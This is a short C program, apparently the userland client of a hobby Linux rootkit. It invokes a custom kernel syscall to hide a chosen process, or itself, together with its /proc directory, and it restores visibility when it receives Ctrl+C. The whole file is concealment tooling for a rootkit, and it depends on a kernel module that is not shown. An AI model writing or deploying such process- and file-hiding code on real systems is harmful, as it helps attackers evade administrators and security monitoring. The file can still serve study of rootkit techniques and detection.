#include <unistd.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <signal.h>
#include <stdlib.h>

#include "types.h"

#define PROCDIR_LEN (128)

static pid_t pid;
static char procdir[PROCDIR_LEN];

/***
 * SIGINT handler. When ctrl + c is pushed the task tries to stop being
 * hide.
 */
void term_handler(int sig) {
	syscallData data;

	data.pid = pid;
	syscall(YARR_SYSCALL, STOP_HIDE_PROCESS, &data);

	data.filename = procdir;
	syscall(YARR_SYSCALL, STOP_HIDE_FILE, &data);
	exit(0);
}

/***
 * This program tries to hide the process with the PID passed or itself if
 * no PID was given.
 */
int main(int argc, char *argv[]) {
	syscallData data;

	if (argc < 2)
		pid = getpid();
	else
		pid = atoi(argv[1]);

	printf("Hiding task %d.\n", pid);
	data.pid = pid;
	syscall(YARR_SYSCALL, HIDE_PROCESS, &data);

	printf("Hiding /proc/%d interface.\n", pid);
	snprintf(procdir, PROCDIR_LEN, "/proc/%d", pid);
	data.filename = procdir;
	syscall(YARR_SYSCALL, HIDE_FILE, &data);

	// Set the handler for SIGINT.
	signal(SIGINT, term_handler);

	// Do nothing until we receive SIGINT (or other signals, but the
	// interesting one is SIGINT).
	while(0x01ec0ded);
	return 0;
}
